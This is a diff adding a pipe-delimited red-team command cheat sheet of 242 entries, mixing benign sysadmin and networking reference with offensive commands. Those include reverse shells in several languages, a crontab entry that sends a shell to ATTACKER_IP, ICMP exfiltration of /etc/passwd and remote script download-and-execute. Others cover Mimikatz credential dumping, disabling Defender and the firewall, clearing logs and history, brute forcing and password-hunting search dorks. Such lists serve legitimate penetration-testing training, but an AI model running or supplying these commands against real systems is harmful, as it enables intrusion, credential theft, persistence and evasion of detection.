@@ -1,0 +1,242 @@
+red|OSINT - Google: site search|site:<URL>
+red|OSINT - Google: filetype|filetype:pdf site:<DOMAIN>
+red|OSINT - Google: find passwords|filetype:txt "username" "password"
+red|OSINT - Google: index listings|intitle:"index of" site:<DOMAIN>
+red|OSINT - Google: SQL dumps|filetype:sql "INSERT INTO"
+red|OSINT - Google: config files|ext:env "DB_PASSWORD"
+red|OSINT - Shodan|shodan.io
+red|OSINT - theHarvester|theHarvester -d <DOMAIN> -b all -l 500
+red|OSINT - Recon-ng Framework|recon-ng
+red|OSINT - Maltego|maltego.com
+red|OSINT - Certificate Transparency|curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq .
+red|OSINT - Subdomain Enum (amass)|amass enum -d <DOMAIN>
+red|OSINT - Subdomain Enum (subfinder)|subfinder -d <DOMAIN>
+red|OSINT - Email Harvest|theHarvester -d <DOMAIN> -b google,linkedin
+red|OSINT - WHOIS|whois <DOMAIN>
+red|OSINT - DNS Any|dig <DOMAIN> ANY
+red|OSINT - DNS Zone Transfer|dig axfr <DOMAIN> @<NS_IP>
+red|OSINT - Reverse DNS|dig -x <IP>
+red|OSINT - DNS Brute Force|dnsrecon -d <DOMAIN> -t brt -D subdomains.txt
+red|Windows - OS Version|ver && systeminfo
+red|Windows - Hotfixes|wmic qfe list
+red|Windows - CPU Arch|wmic cpu get datawidth /format:list
+red|Windows - Situational Awareness|systeminfo
+red|Windows - Net Shares|net share
+red|Windows - Net Sessions|net session
+red|Windows - Process List|tasklist /svc
+red|Windows - Kill Process|taskkill /F /IM <PROCESS_NAME> /T
+red|Windows - Process Paths|wmic process get name,executablepath,processid
+red|Windows - Network Config|ipconfig /all
+red|Windows - DNS Cache|ipconfig /displaydns
+red|Windows - All Connections+PID|netstat -ano
+red|Windows - Netstat to File|netstat -anop tcp 3 >> <FILE>
+red|Windows - Routing Table|route print
+red|Windows - ARP Table|arp -a
+red|Windows - DNS Zone Transfer|nslookup; server <FQDN>; set type=ANY; ls -d <DOMAIN>
+red|Windows - Registry Password Search|reg query HKLM /f password /t REG_SZ /s
+red|Windows - Save Security Hive|reg save HKLM\Security security.hive
+red|Windows - Last Registry Key|HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit /v LastKey
+red|Windows - Typed URLs|HKCU\Software\Microsoft\Internet Explorer\TypedURLs
+red|Windows - PuTTY Sessions|HKCU\Software\SimonTatham\Putty\Sessions
+red|Windows - Remote Process List|tasklist /v /s <IP>
+red|Windows - Remote WMI Exec|wmic /node:<IP> /user:<DOMAIN>\<USER> /password:<PASS> process call create "<CMD>"
+red|Windows - File Search PDF|dir /a /s /b C:\*pdf*
+red|Windows - Findstr Password|findstr /SI password *.txt *.xml *.ini *.config
+red|Windows - File Type Display|type <FILE>
+red|Windows - Count Lines|type <FILE> | find /c /v ""
+red|Windows - Tree to File|tree.com /F /A > tree.log
+red|Windows - VSS List|vssadmin list shadows
+red|Windows - VSS Create|wmic shadowcopy call create Volume=c:\
+red|Windows - VSS Link|mklink /D C:\restore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+red|Windows - Remote SC Execution|sc \\<IP> config vss binpath= "<FILE>" && sc \\<IP> start vss
+red|Windows - Remote Schtask|schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE> /s <IP>
+red|Windows - AD Domain Admins|net localgroup administrators /domain
+red|Windows - AD All Users|net user /domain
+red|Windows - AD User Info|net user <USERNAME> /domain
+red|Windows - AD Account Policy|net accounts /domain
+red|Windows - DSQUERY Admin Users|dsquery * -filter "(&(objectclass=user)(admincount=1))" -attr samaccountname name
+red|Windows - DSQUERY Domain Trusts|dsquery * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection
+red|Windows - Port Forward (netsh)|netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2
+red|Windows - Disable Firewall|netsh advfirewall set allprofiles state off
+red|Windows - Disable Defender (SC)|sc config WinDefend start= disabled && sc stop WinDefend
+red|Windows - Disable Defender (PS)|Set-MpPreference -DisableRealtimeMonitoring $true
+red|Windows - Clear Event Logs|wevtutil cl Application && wevtutil cl Security
+red|Windows - Backup Event Log|wevtutil cl Application /bu:<FILE>.evtx
+red|Windows - Last 100 Logons|wevtutil qe security /q:"*[System[(EventID=4624)]]" /c:100 /rd:true
+red|Windows - Schtask User Persist|schtasks /Create /F /SC DAILY /ST 09:00 /TN OfficeUpdater /TR <FILE>
+red|Windows - Run Key Persist|reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V OfficeUpdater /t REG_SZ /F /D <FILE>
+red|Windows - Startup Dir All Users|%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+red|Windows - Service Persist|sc create <SVC> binPath="<FILE>" start=auto && sc start <SVC>
+red|Windows - DLL Hijack WPTS|reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH
+red|Mimikatz - Pass the Hash|mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:<FILE>" exit
+red|Mimikatz - Dump SAM|mimikatz.exe "lsadump::sam" exit
+red|Mimikatz - Get Secrets|mimikatz.exe "lsadump::secrets" exit
+red|Mimikatz - Logon Passwords|mimikatz.exe "sekurlsa::logonpasswords" exit
+red|Windows PrivEsc - Checklist|SharpUp.exe && PowerUp.ps1 && WinPEAS
+red|Windows PrivEsc - Unquoted Paths|wmic service get name,pathname | findstr /v """
+red|Mac - Display Apps|ls /Applications
+red|Mac - Hostname|hostname
+red|Mac - Disk Usage|df -h
+red|Mac - Kernel Info|uname -a
+red|Mac - Logged In Users|w && last
+red|Mac - All Users|dscl . list /Users
+red|Mac - User Plist|sudo plutil -p /var/db/dslocal/nodes/Default/users/<USER>.plist
+red|Mac - User Hash|sudo dscl . read Users/<USER> ShadowHashData
+red|Mac - Create User|dscl . -create /Users/<USER>
+red|Mac - Add User to Admin|dscl . -append /Groups/admin GroupMembership <USER>
+red|Mac - DNS Zone Transfer|dig axfr <DOMAIN> @<DNS_IP>
+red|Linux - OS Info|cat /etc/os-release && uname -a
+red|Linux - Disk Usage|df -h
+red|Linux - Logged Users|w && who -a && last -a
+red|Linux - Processes|ps -ef
+red|Linux - Kill by PID|kill -9 <PID>
+red|Linux - Kill by Name|killall <PROCESS_NAME>
+red|Linux - Lock User|usermod --expiredate 1 --lock --shell /bin/nologin <USER>
+red|Linux - Unlock User|usermod --expiredate 99999 --unlock --shell /bin/bash <USER>
+red|Linux - Network Sockets|watch --interval 3 ss -t --all
+red|Linux - All Listening Ports|netstat -tulpn
+red|Linux - Network by User|lsof -i -u <USER> -a
+red|Linux - Change MTU|ip link set dev <IF> mtu <SIZE>
+red|Linux - Change MAC|ip link set dev <IF> down && ip link set dev <IF> address <MAC> && ip link set dev <IF> up
+red|Linux - Add DNS Server|echo "nameserver <IP>" >> /etc/resolv.conf
+red|Linux - DNS Zone Transfer|dig axfr <DOMAIN> @<DNS_IP>
+red|Linux - Reverse DNS|dig -x <IP>
+red|Linux - Compare Files|diff <FILE_A> <FILE_B>
+red|Linux - Secure Delete|shred -f -u <FILE>
+red|Linux - Touch Timestamp|touch -r <ORIGINAL> <MOD_FILE>
+red|Linux - Search SUID|find / -perm -4000 -exec ls -ld {} \;
+red|Linux - File Type|file <FILE>
+red|Linux - Grep Recursive|grep -Ria "<PHRASE>"
+red|Linux - TAR Compress|tar -czf output.tar.gz <INPUT>
+red|Linux - TAR Extract|tar -xzf file.tar.gz
+red|Linux - Split File|split -b 10M <FILE> chunk_
+red|Linux - MD5 Hash File|md5sum <FILE>
+red|Linux - rc.local Persist|echo "<FILE>" >> /etc/rc.local
+red|Linux - Crontab Persist|crontab -e && 0 0 * * * nc <ATTACKER_IP> <PORT> -e /bin/sh
+red|Linux - Poison Bashrc|echo "<PAYLOAD>" >> ~/.bashrc
+red|Linux - SSH Authorized Key|echo "<PUBKEY>" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+red|Linux - Clear Bash History|export HISTFILE=/dev/null && history -c
+red|Linux - Mount USB|mount <DEVICE> /media/usb
+red|Linux - Compile C|gcc <FILE>.c -o <OUTPUT>
+red|Linux - Record Microphone|arecord -d 5 -D plughw <OUTPUT>
+red|Linux - Strip URLs from File|cat <FILE> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u
+red|Linux - SMB Connect|smbclient -U <USER> //<IP>/<SHARE>
+red|SSH - Generate DSA Keys|ssh-keygen -t dsa -f <OUTPUT>
+red|SSH - Generate RSA Keys|ssh-keygen -t rsa -f <OUTPUT>
+red|SSH - Upload File|scp <SOURCE> <USER>@<IP>:/<DEST>
+red|SSH - Enable Port Forward|AllowTcpForwarding Yes && GatewayPorts Yes (in /etc/ssh/sshd_config)
+red|SSH - Remote Tunnel|ssh -R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>
+red|SSH - ProxyChains Config|socks 4 <IP> <PORT> >> /etc/proxychains.conf
+red|SSH - ProxyChains Nmap|proxychains nmap -sT -Pn -n -p80,443 <TARGET>
+red|TCPDump - Capture Headers+Data|tcpdump -i eth0 -XX -w output.pcap
+red|TCPDump - HTTP to Dest|tcpdump tcp port 80 and dst 2.2.2.2
+red|TCPDump - Host Exclude SSH|tcpdump -i eth0 -tttt dst 192.168.1.22 and not dst port 22
+red|TCPDump - ICMP Ping Reply|tcpdump -i eth0 "icmp[0] == 8"
+red|TCPDump - Capture DNS UDP|tcpdump -i eth0 -c 50 -tttt udp port 53
+red|TCPDump - Source Host|tcpdump src 1.1.1.1
+red|TCPDump - Dest Host|tcpdump dst 1.0.0.1
+red|TCPDump - Grab Passwords|tcpdump port http or port ftp or port smtp or port imap -lA | egrep -i -B5 'pass=|pwd=|log=|login='
+red|TCPReplay - Default Replay|tcpreplay -i eth0 capture.pcap
+red|TCPReplay - Full Speed|tcpreplay --topspeed -i eth0 capture.pcap
+red|Screen - New Named Session|screen -S <NAME>
+red|Screen - List Sessions|screen -ls
+red|Screen - Attach Session|screen -r <NAME>
+red|Screen - Send Command|screen -S <NAME> -X <COMMAND>
+red|IPTables - Save with Counters|iptables-save -c > rules.out
+red|IPTables - Restore|iptables-restore < rules.out
+red|IPTables - List with Line Numbers|iptables -L -v --line-numbers
+red|IPTables - List NAT|iptables -L -t nat --line-numbers
+red|IPTables - Flush All|iptables -F
+red|IPTables - Allow SSH Out|iptables -A OUTPUT -o <IF> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+red|IPTables - Allow ICMP Out|iptables -A OUTPUT -o <IF> -p icmp --icmp-type echo-request -j ACCEPT
+red|IPTables - Port Forward|iptables -t nat -A PREROUTING -i <IF> -p tcp --dport 3389 -j DNAT --to 192.168.1.2:3389
+red|IPTables - Enable IP Forward|echo "1" > /proc/sys/net/ipv4/ip_forward
+red|IPTables - Log and Drop|iptables -N LOGGING && iptables -A INPUT -j LOGGING && iptables -A LOGGING -j DROP
+red|Service - List All|systemctl list-unit-files --type=service
+red|Service - Start|service <NAME> start
+red|Service - Stop|service <NAME> stop
+red|Service - Disable|systemctl disable <NAME>
+red|Cisco - Enable Mode|> enable
+red|Cisco - Config Mode|# configure terminal
+red|Cisco - Set Interface IP|(config-if)# ip addr <IP> <MASK>
+red|Cisco - Show Access Lists|#show access-lists
+red|Cisco - Backup Config|#copy running-config tftp
+red|Networking - IPv4 Class A|0.0.0.0 - 127.255.255.255
+red|Networking - IPv4 Class B|128.0.0.0 - 191.255.255.255
+red|Networking - IPv4 Class C|192.0.0.0 - 223.255.255.255
+red|Networking - Private RFC1918|10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
+red|Networking - Subnet /24|255.255.255.0 = 254 hosts
+red|Networking - Subnet /25|255.255.255.128 = 126 hosts
+red|Networking - Subnet /28|255.255.255.240 = 14 hosts
+red|Networking - Subnet /30|255.255.255.252 = 2 hosts
+red|Networking - IPv6 Link Local|fe80::
+red|Networking - IPv6 All Nodes|ff02::1
+red|Networking - IPv6 All Routers|ff02::2
+red|Networking - TTL Linux|64 (default)
+red|Networking - TTL Windows|128 (default)
+red|Networking - TTL Cisco|255 (default)
+red|Nmap - SYN Scan|nmap -sS <TARGET>
+red|Nmap - Connect Scan|nmap -sT <TARGET>
+red|Nmap - UDP Scan|nmap -sU <TARGET>
+red|Nmap - No Ping|nmap -Pn <TARGET>
+red|Nmap - All Ports|nmap -p- <TARGET>
+red|Nmap - Service + OS|nmap -sV -O <TARGET>
+red|Nmap - Aggressive|nmap -A -T4 <TARGET>
+red|Nmap - Output Normal|nmap -oN output.txt <TARGET>
+red|Nmap - Output XML|nmap -oX output.xml <TARGET>
+red|Nmap - Firewall Evasion Fragment|nmap -f <TARGET>
+red|Nmap - Decoy Scan|nmap -D RND:10 <TARGET>
+red|Wireshark - Filter Host|ip.addr == <IP>
+red|Wireshark - Filter Port|tcp.port == 80
+red|Wireshark - HTTP GET|http.request.method == "GET"
+red|Wireshark - DNS Queries|dns.flags.response == 0
+red|Netcat - Listen|nc -lvnp <PORT>
+red|Netcat - Connect|nc <HOST> <PORT>
+red|Netcat - Reverse Shell|nc -e /bin/bash <IP> <PORT>
+red|Netcat - Send File|nc -w 3 <HOST> <PORT> < file
+red|Netcat - Receive File|nc -lvnp <PORT> > file
+red|Hydra - SSH Brute|hydra -L users.txt -P pass.txt ssh://<IP>
+red|Hydra - HTTP POST|hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=error"
+red|Hydra - FTP|hydra -L users.txt -P pass.txt ftp://<IP>
+red|Hydra - RDP|hydra -L users.txt -P pass.txt rdp://<IP>
+red|John the Ripper - Crack|john --wordlist=rockyou.txt hashes.txt
+red|John the Ripper - NT Hash|john --format=NT hashes.txt
+red|John the Ripper - Show Cracked|john --show hashes.txt
+red|SQLMap - Basic|sqlmap -u "http://target/?id=1"
+red|SQLMap - Get DBs|sqlmap -u "URL?id=1" --dbs
+red|SQLMap - Dump Table|sqlmap -u "URL?id=1" -D <DB> -T <TABLE> --dump
+red|SQLMap - POST Request|sqlmap -u "URL" --data="user=a&pass=b"
+red|SQLMap - From Burp File|sqlmap -r request.txt
+red|SQLMap - OS Shell|sqlmap -u "URL?id=1" --os-shell
+red|Reverse Shell - Bash|bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+red|Reverse Shell - Python3|python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+red|Reverse Shell - Perl|perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+red|Reverse Shell - Netcat|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
+red|Reverse Shell - PHP|php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+red|Reverse Shell - PowerShell|powershell -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();..."
+red|Reverse Shell - Ruby|ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+red|Upgrade Shell - PTY|python3 -c 'import pty; pty.spawn("/bin/bash")'
+red|Upgrade Shell - Full TTY|Ctrl+Z then: stty raw -echo; fg; export TERM=xterm
+red|Python - HTTP Server|python3 -m http.server 8080
+red|Python - Base64 Encode|python3 -c "import base64; print(base64.b64encode(b'<TEXT>').decode())"
+red|Python - Base64 Decode|python3 -c "import base64; print(base64.b64decode('<B64>').decode())"
+red|Python - URL Encode|python3 -c "import urllib.parse; print(urllib.parse.quote('<TEXT>'))"
+red|Python - Port Check|python3 -c "import socket; s=socket.socket(); print(s.connect_ex(('<IP>',<PORT>)))"
+red|PowerShell - Execution Bypass|powershell -ep bypass -nop -File <FILE>
+red|PowerShell - Port Check|$ports=(80,443);$ip="<IP>";foreach($p in $ports){try{$s=New-Object Net.Sockets.TCPClient($ip,$p)}catch{};if($s){echo "$ip:$p Open"}}
+red|PowerShell - Ping with Timeout|$ping=New-Object Net.NetworkInformation.Ping; $ping.Send("<IP>",500)
+red|PowerShell - Download File|Invoke-WebRequest -Uri <URL> -OutFile <FILE>
+red|PowerShell - Download String|IEX (New-Object Net.WebClient).DownloadString('<URL>')
+red|PowerShell - Upload File via HTTP|$http=New-Object Net.WebClient; $http.UploadFile("<SERVER>","<FILE>")
+red|PowerShell - Export WMI to CSV|Get-WmiObject -class win32_operatingsystem | select -property * | export-csv <FILE>
+red|PowerShell - Send Email|Send-MailMessage -to "<TO>" -from "<FROM>" -subject "<SUBJ>" -body "<BODY>" -SmtpServer "<IP>"
+red|Batch - Nested Ping Sweep|for /L %i in (10,1,254) do @(for /L %x in (10,1,254) do @ping -n 1 -w 100 10.10.%i.%x 2>nul | find "Reply" && echo 10.10.%i.%x >> live.txt)
+red|Batch - Loop File Lines|for /F "tokens=*" %%A in (<FILE>) do echo %%A
+red|Batch - Domain Brute Forcer|for /F %%N in (users.txt) do for /F %%P in (passwords.txt) do net use \\<IP>\IPC$ /user:<DOMAIN>\%%N %%P 1>NUL 2>&1 && echo %%N:%%P
+red|Batch - Search for pass files|forfiles /P <PATH> /s /m pass* -c "cmd /c echo @isdir @fdate @relpath @path @fsize"
+red|Scapy - Send IPv6 ICMP|from scapy.all import *; send(IPv6(dst="<IP>")/ICMPv6EchoRequest())
+red|Scapy - UDP Payload|send(IP(dst="<IP>")/UDP(dport=<PORT>)/Raw(load="<PAYLOAD>"))
+red|Tips - FTP Non-Interactive Shell|echo open <IP> 21 > ftp.txt && echo user <USER> <PASS> >> ftp.txt && ftp -v -n -s:ftp.txt
+red|Tips - Exfil via ICMP|ping -c 1 -p $(cat /etc/passwd | xxd -p | head -1) <IP>
+red|Tips - DNS Transfer Linux|dig axfr <DOMAIN> @<DNS_IP>
+red|Tips - Send Email Telnet|telnet <RELAY_IP> 25; EHLO test; MAIL FROM: ...; RCPT TO: ...; DATA; ...
